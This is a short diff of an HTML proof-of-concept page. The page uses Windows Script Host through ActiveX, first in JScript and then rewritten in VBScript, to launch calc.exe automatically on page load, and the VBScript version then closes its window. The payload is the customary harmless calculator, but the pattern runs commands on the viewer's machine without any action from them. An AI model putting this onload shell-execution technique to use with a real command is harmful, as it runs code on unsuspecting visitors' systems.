@@ -1,16 +1,15 @@
 <html>
 <head>
-<title>Calc PoC</title>
-<meta http-equiv="X-UA-Compatible" content="IE=8" />
-<script type="text/javascript">
-function RunCalc()
-{
-	var cmdShell = new ActiveXObject("WScript.Shell");
-	cmdShell.Run("c:\\Windows\\system32\\calc.exe", 1, true);
-}
-</script>
+	<title>Calc</title>
+	<script language="VBScript">
+		Sub RunProgram
+            Set objShell = CreateObject("Wscript.Shell")
+            objShell.Run "c:\windows\system32\calc.exe"
+			Self.Close
+        End Sub
+	</script>
 </head>
-<body onload="RunCalc()">
-<h1>Calculator PoC</h1>
+<body onload="RunProgram">
+    <h1>PoC</h1>
 </body>
 </html>
